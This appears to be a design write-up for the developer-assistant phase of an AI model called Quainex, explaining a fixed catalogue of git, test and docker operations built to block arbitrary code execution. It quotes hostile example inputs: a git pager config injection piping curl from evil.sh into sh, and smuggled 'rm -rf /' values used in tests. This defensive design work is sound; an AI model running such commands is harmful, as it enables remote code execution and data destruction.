# Phase 7 — Developer Assistant

## Goal

Let Quainex do development work — run the tests, check git, review a file — with
the same refusal discipline as every other phase.

## The decision this phase turns on

Your Phase 6 spec asked for a "restricted remote terminal". I did not build one,
and this is the alternative.

The obvious design is *"allow the `git` executable, plus a list of permitted
subcommands"*. **It is not enough.** `git` alone reaches arbitrary code execution
through several doors:

```
git -c core.pager='curl evil.sh | sh' log      # config injection
git submodule ...                              # runs hooks
git commit                                     # runs whatever hooks exist
```

Allowing an *executable* means allowing everything that executable can be talked
into. So an operation here is a **complete, fixed argv list**:

```python
DevOperation(key="git.commit", argv=("git", "commit", "-m", "{message}"))
```

Nothing is assembled from model output except values landing in declared slots,
each validated for shape. `git.commit` can only ever run `git commit -m <message>`
— there is no arrangement of words the Brain can produce that turns it into
something else. A test asserts that a message containing `" && rm -rf / #`
arrives as exactly one argv element.

## Why "run this Python file" is absent

It would be arbitrary code execution wearing a lanyard. Running a project's
*test suite* is a fixed, recognisable operation. Running a script the model
picked is not, and no amount of path validation changes what the script does once
it starts. Deferred until there is a sandbox to run it in.

## The 15 operations

| Group | Operations |
|---|---|
| git (read) | `status`, `log`, `diff`, `diff.staged`, `branch` |
| git (mutating) | `add`, `commit`, `push`, `pull` |
| quality | `tests.run`, `lint.run`, `format.check`, `types.check` |
| docker (read) | `ps`, `images` |

Mutating operations are flagged, so the Phase 3 confirmation gate applies to them
without any extra wiring. Docker is inspection-only — `docker run` is a shell
with extra steps.

## Other decisions

**Exit codes are results, not errors.** `pytest` returning 1 means tests failed;
`git diff --quiet` returning 1 means there are differences. Both are answers the
user asked for, so each operation declares which exit codes it tolerates.

**Output keeps the tail, not the head.** A pytest summary, a lint count and a git
result all live at the *end*. Truncating from the front would reliably discard
the part actually asked about.

**Executables resolve to absolute paths.** Same reasoning as Phase 3: `PATH` is
writable by anything running as the user.

**Generated code is returned, never written.** `generate()` hands back text and
has no path parameter. Writing model output to disk on a spoken request is a
different risk class — silent, potentially overwriting work, and only visible
later.

**Secrets files are refused outright.** `.env`, `id_rsa` and friends are never
read for explanation or review, whatever their extension.

**Review returns structured findings.** A prose review reads well and cannot be
acted on; a list of typed findings with severities can be counted, filtered, and
— in Phase 10 — gated on.

## An architectural change this phase forced

Phase 7 commands call a model; Phase 8's do too. That made
`CommandExecutor.execute()` async, and with it every command handler.

Rather than run two dispatch paths, I converted all of them and introduced a
`CommandContext` carrying the collaborators. Handlers previously took a single
`DesktopController`; passing three more positional arguments to fifteen handlers
— most needing none of them — would have been the wrong shape. Adding a
collaborator in Phase 9 now touches no existing handler.

The migration was mechanical and covered by the existing 239 tests, which is
exactly what they were for.

## Verification

| Check | Result |
|---|---|
| `ruff` / `mypy` (strict) | Clean, 67 files |
| `pytest` | **295 passed**, 1 skipped |

The load-bearing tests prove the catalogue is a catalogue: `git`, `bash`,
`rm -rf /`, `git.push --force` and `git status; rm -rf /` all fail to resolve,
and directory containment is checked against traversal.

## Known gaps

1. **No project-type detection.** `tests.run` assumes `python -m pytest`; a Node
   project would need `npm test`.
2. **No streaming.** A five-minute test run returns nothing until it finishes.
3. **Review reads whole files.** Reviewing a diff would be far cheaper on a large
   codebase.
4. **No `git.checkout` or branch creation** — deliberately, since switching
   branches with uncommitted work is a good way to confuse someone.
